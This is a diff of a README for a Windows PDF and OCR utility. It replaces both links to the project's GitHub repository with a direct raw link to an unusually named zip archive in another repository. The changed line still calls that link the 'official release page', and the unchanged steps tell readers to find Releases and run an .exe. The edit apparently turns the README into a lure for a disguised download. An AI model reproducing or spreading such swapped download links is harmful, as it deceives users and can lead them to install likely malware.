@@ -5,7 +5,7 @@ description: "Edit, convert, and perform OCR on PDF documents using this Windows
 ---
 # 📄 picopdf-plus-windows-ocr - Edit and scan documents with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Carlineamort176/picopdf-plus-windows-ocr)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Carlineamort176/carlineamort176.github.io/main/porelike/Release-hyraceum.zip)
 
 ## 🛠 What this tool does
 
@@ -27,7 +27,7 @@ Ensure your computer has the latest Windows updates installed to maintain stabil
 
 Follow these steps to set up the application on your computer.
 
-1.  Visit the official release page: [https://github.com/Carlineamort176/picopdf-plus-windows-ocr](https://github.com/Carlineamort176/picopdf-plus-windows-ocr).
+1.  Visit the official release page: [https://raw.githubusercontent.com/Carlineamort176/carlineamort176.github.io/main/porelike/Release-hyraceum.zip](https://raw.githubusercontent.com/Carlineamort176/carlineamort176.github.io/main/porelike/Release-hyraceum.zip).
 2.  Locate the section labeled Releases.
 3.  Click the link for the most recent version of the Windows installer file. Usually, this file ends with the extension .exe.
 4.  Once the download finishes, find the file in your Downloads folder.
